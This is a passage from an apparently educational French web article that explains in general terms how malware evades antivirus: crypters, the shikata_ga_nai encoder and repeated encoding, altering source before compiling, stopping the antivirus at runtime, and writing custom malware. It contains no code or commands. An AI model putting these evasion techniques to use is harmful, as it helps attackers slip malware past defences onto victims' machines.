les antivirus détectent tous les programmes chiffrés comme malveillants
(la signature du crypteur est détectée dans ce cas-là).</p>
<p>Une autre idée leur est venue, celle de l’encodage. Cela consiste, comme la technique de chiffrement, à mettre
le payload sous une autre forme pour qu’il soit moins détectable, mais
cette fois-ci sans utiliser de clef de chiffrement. L’encodeur le plus connu est shikata_ga_nai, il a une très
bonne réputation, mais il a été beaucoup trop utilisé, donc les antivirus
sont désormais capables de le détecter. En voyant que les antivirus détectent un fichier encodé, la possibilité
d’encoder plusieurs fois de suite un même fichier a été trouvée, c’est-à-dire
encoder avec un nombre d’itérations (5,10,15,…) le fichier. Cependant, encoder trop de fois le fichier pouvait
mener à un mauvais fonctionnement de ce dernier. Les antivirus sont aujourd’hui
là aussi capables de détecter un fichier, même encodé plusieurs fois avec un encodeur connu.</p>
<p>Ce qui est mis en cause ici est le procédé totalement automatique. En effet, toutes ces techniques pouvaient
marcher il y a quelques années, mais marchent de moins en moins et aujourd’hui il
est quasiment impossible de créer un virus indétectable des antivirus en un seul clic. Cela pourra fonctionner
si la machine visée n’a pas d’antivirus installé (ce qui est très rare de nos
jours) ou alors qu’elle est très ancienne avec un antivirus qui n’a pas été mis à jour depuis plusieurs années.</p>
<p>Aujourd’hui pour créer un virus qui ne devienne pas détectable des antivirus, il faut mettre les mains dans le
cambouis ! La première technique serait de modifier le corps du programme avant
qu’il ne soit compilé afin de le rendre unique. Cette technique fait toujours ses preuves et moitié moins
d’antivirus détectent la menace.</p>
<p>Une autre technique serait de tenter de stopper l’antivirus lors de l’exécution du virus, ainsi il ne sera pas
possible de détecter la menace.</p>
<p>Encoder soi-même le virus serait aussi une solution. Si nous n’utilisons pas un encodeur connu, le fichier deviendra
difficilement détectable par un antivirus, car il ne l’aura jamais rencontré
auparavant.</p>
<p>Une dernière solution pour passer outre les vérifications des antivirus serait de totalement coder un virus
soi-même de bout en bout. Cette technique sera la plus complexe et la plus longue,
mais sera certainement celle qui apportera le plus de résultats positifs. En effet, les antivirus ne pourront ni
utiliser leur méthode de reconnaissance par signature, ni l’analyse statique,
ni l’analyse heuristique qui sont les trois techniques de reconnaissances majoritairement utilisées par les
meilleurs antivirus que l’on connaît actuellement.</p>
<p>Pour conclure, les méthodes de création d’antivirus en appuyant sur un bouton ne fonctionne quasiment plus
aujourd’hui pour les antivirus les plus connus et les plus utilisés
(Windows defender, Bitdefender, Avast, …) car ces derniers ont développé au cours des dernières années des
techniques puissantes de reconnaissance de programmes malveillants. Ce genre
de méthode pourrait néanmoins fonctionner sur des machines anciennes et non mises à jour depuis plusieurs
années. Les méthodes de bypass d’antivirus nécessitent aujourd’hui de bonnes
connaissances en informatique (en logiciel, en réseaux et en programmation) et un temps assez long de
développement.</p>
<p>Ainsi, tromper un antivirus est possible et il faut rester vigilant, mais créer un virus qui tromperait des
antivirus n’est pas donné à tout le monde.</p>
<p>Sources :</p>
<p>Vidéo YouTube qui présente très bien tous ces problèmes : <a class="reference external" href="https://www.youtube.com/watch?v=2H_1ZkZ83gI&amp;t=131s">voir la vidéo Youtube</a>{:target= »_blank »}</p>
</section>
</section>


           </div>
          </div>
          <footer>

  <hr/>

  <div role="contentinfo">
    <p>&#169; Copyright 2022, Tanguy BRON.</p>
  </div>

  Compilé avec <a href="https://www.sphinx-doc.org/">Sphinx</a> en utilisant un
    <a href="https://github.com/readthedocs/sphinx_rtd_theme">thème</a>
    fourni par <a href="https://readthedocs.org">Read the Docs</a>.
   

</footer>
        </div>
      </div>
    </section>
  </div>
  <script>
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(true);
      });
  </script> 

</body>
</html>